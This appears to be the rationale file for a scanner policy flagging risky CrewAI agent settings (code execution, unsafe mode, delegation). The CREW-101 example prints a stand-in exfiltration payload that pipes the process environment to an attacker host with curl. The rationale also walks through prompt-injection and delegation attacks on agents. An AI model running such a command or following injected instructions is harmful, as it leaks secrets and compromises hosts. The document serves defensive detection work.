---
policy_id: crewai_agent_safety
category: crewai
topic: agent_safety
rules:
  - id: CREW-101
    severity: high
    confidence: 0.9
    scope: agent
    fix_type: config
  - id: CREW-102
    severity: high
    confidence: 0.9
    scope: agent
    fix_type: config
  - id: CREW-104
    severity: medium
    confidence: 0.75
    scope: agent
    fix_type: config
references: [LLM05, LLM06]
---

# Policy Rationale: CrewAI Agent Safety

**Policy ID:** `crewai_agent_safety`  
**File:** `crewai/agent_safety.yaml`  
**Rules:** CREW-101, CREW-102, CREW-104  
**Severities:** high, high, medium  
**Fix types:** config, config, config  
**References:** LLM05 (Improper Output Handling), LLM06 (Excessive Agency)

---

## What this policy covers

Agent-scope rules for the CrewAI `Agent(...)` constructor (normalized class
`crewai_agent`). They read three constructor kwargs that hand the model
execution or delegation reach: `allow_code_execution=True` (CREW-101),
`code_execution_mode="unsafe"` (CREW-102), and `allow_delegation=True`
(CREW-104). Each is matched by the `agent_kwarg_value` predicate against the
literal value in the constructor call, so the rule fires on the declaration
itself, not on any downstream use.

---

## Why agent configuration is a distinct concern in CrewAI

CrewAI's `Agent` constructor is where capability is granted, and two of its
kwargs grant the single most dangerous capability — running model-generated
code. `allow_code_execution=True` makes CrewAI auto-inject a
`CodeInterpreterTool` into the agent's tool set; from that point the model can
run arbitrary Python it generates. Because the agent's instructions, the tool
outputs it consumes, and any content it retrieves are all model-reachable, a
single prompt injection has a direct path from text to code execution. This is
not a hypothetical: it is the entry point of CrewAI's published RCE chain —
CVE-2026-2275 escapes the SandboxPython interpreter via a `ctypes` call, and
CVE-2026-2287 silently falls back from the Docker sandbox to host execution
when Docker is unavailable. `code_execution_mode="unsafe"` is worse still: it
removes the container boundary entirely and runs model code directly on the
host, so there is nothing left to escape.

Delegation (CREW-104) is a different shape of the same excessive-agency
problem. An agent with `allow_delegation=True` can hand work to any peer in the
crew and invoke that peer's tools, so its effective trust boundary becomes the
union of every reachable peer's capabilities — with no per-delegation gate.
This is a textbook confused-deputy setup: if any peer holds the code
interpreter or an unconstrained file reader, a prompt injection against this
agent can reach that capability indirectly, even though this agent was never
granted it directly. In an agent crew the attacker does not need to compromise
the powerful agent; it only needs to compromise one that can delegate to it.

---

## Rule-by-rule defense

### CREW-101 — Agent enables built-in code execution (Severity: high, Confidence: 0.9, Fix type: config)

**What we detect:** an `Agent(...)` call with `allow_code_execution=True`
(predicate `agent_kwarg_value`).

**Why it is flaggable:** the flag makes CrewAI inject a `CodeInterpreterTool`,
putting model-generated Python on the agent's tool surface. The capability is
the defect — every safeguard is bolted onto an interpreter the model can drive.
This flag is the documented entry point of CVE-2026-2275 / CVE-2026-2287, and it
is deprecated upstream.

**Real-world consequence:** an agent built to "summarize a report" is given
`allow_code_execution=True`; a crafted instruction in the report makes it run
`__import__('os').system('curl attacker/$(env | base64)')`, exfiltrating the
process environment.

**Why severity is high and not critical:** the engine reserves critical for
unconditional RCE; here execution still passes through CrewAI's sandbox in the
default `safe` mode, so a successful attack requires a sandbox escape or a
Docker-unavailable fallback rather than landing on the host unconditionally.
**Fix type — config:** the fix is deleting a constructor kwarg, no tool source
changes. **Confidence 0.9:** the literal-value match is unambiguous; the small
gap covers an agent that sets the flag but is provably never reachable by
untrusted input, which the constructor match cannot see.

### CREW-102 — Agent runs code execution in unsafe mode (Severity: high, Confidence: 0.9, Fix type: config)

**What we detect:** an `Agent(...)` call with `code_execution_mode="unsafe"`
(predicate `agent_kwarg_value`).

**Why it is flaggable:** `unsafe` tells CrewAI to run model-generated code
directly on the host instead of inside the Docker sandbox. There is no boundary
left to escape, so a single injection yields code execution with the agent
process's privileges — strictly worse than the default `safe` mode.

**Real-world consequence:** the same summarizer agent, now in `unsafe` mode,
runs the injected command on the host directly — no container, immediate
compromise of whatever the service account can reach.

**Why severity is high and not critical:** the rule still requires that code
execution be wired and reachable by model-influenced input; it is high for the
same calibration reason as CREW-101, kept off critical because the engine
reserves that tier and because an agent may be exercised only on trusted,
non-injectable input. **Fix type — config:** delete the kwarg (the default
`safe` keeps execution in Docker). **Confidence 0.9:** unambiguous literal
match.

### CREW-104 — Agent allows delegation to peer agents (Severity: medium, Confidence: 0.75, Fix type: config)

**What we detect:** an `Agent(...)` call with `allow_delegation=True`
(predicate `agent_kwarg_value`).

**Why it is flaggable:** delegation widens the agent's effective capability set
to that of every peer it can reach, with no per-delegation gate — a
confused-deputy path to any high-risk tool held by a peer.

**Real-world consequence:** a low-privilege "researcher" agent with
`allow_delegation=True` is prompt-injected to delegate to a "coder" peer that
holds the code interpreter, reaching execution it was never granted.

**Why severity is medium and not high:** delegation is only dangerous in
proportion to what the reachable peers can do; a crew where no peer holds a
risky tool is exposed to nothing worse than wasted turns, so the impact is
conditional in a way code execution is not. **Fix type — config:** flip the
constructor kwarg. **Confidence 0.75:** the rule cannot see whether any
reachable peer actually holds a dangerous capability, so it over-flags benign
all-read-only crews — the gap that drops it below the code-execution rules.

---

## What this policy does not cover

- Code execution wired by hand rather than via the flag — an `Agent` whose
  `tools=[...]` lists `CodeInterpreterTool` directly is caught by **CREW-103**
  (code_execution.md), not here.
- Whether the agent's input is actually reachable by untrusted content. The
  rules flag the capability grant, not a proven injection path, so an agent
  exercised only on trusted input is a (deliberate) false positive.
- Delegation risk is judged structurally: CREW-104 does not resolve the peer
  graph to confirm a dangerous capability is reachable, so it neither suppresses
  on a safe crew nor escalates on a dangerous one.
- `Crew`-level execution settings and the `Process` topology (sequential vs.
  hierarchical) that influence which agents can delegate are out of scope.

---

## Recommendations beyond the fix

```python
from crewai import Agent

# Safe form: no in-process code execution, no open delegation.
researcher = Agent(
    role="Researcher",
    goal="Summarize the supplied report",
    backstory="...",
    allow_code_execution=False,   # never inject the in-process interpreter
    allow_delegation=False,       # keep the trust boundary at this agent
    tools=[vetted_search_tool],   # only the minimum the role needs
)
```

1. If code execution is a genuine product requirement, run it **outside CrewAI**
   in a hardened external sandbox (E2B, Modal, or an isolated runner with no
   filesystem, no network, no credentials, and a hard timeout) and gate every
   run behind explicit human approval.
2. If the crew must delegate, keep high-risk tools (code execution, file read,
   shell) off every agent reachable through delegation, and constrain each
   peer's tool set to the minimum its role requires.
3. Prefer the default `safe` execution mode unconditionally; never set
   `code_execution_mode="unsafe"` even in development, where a stray injection
   on a developer machine reaches the host directly.
4. Treat retrieved content and prior tool output as untrusted — they are the
   model-reachable surface a prompt injection rides in on.
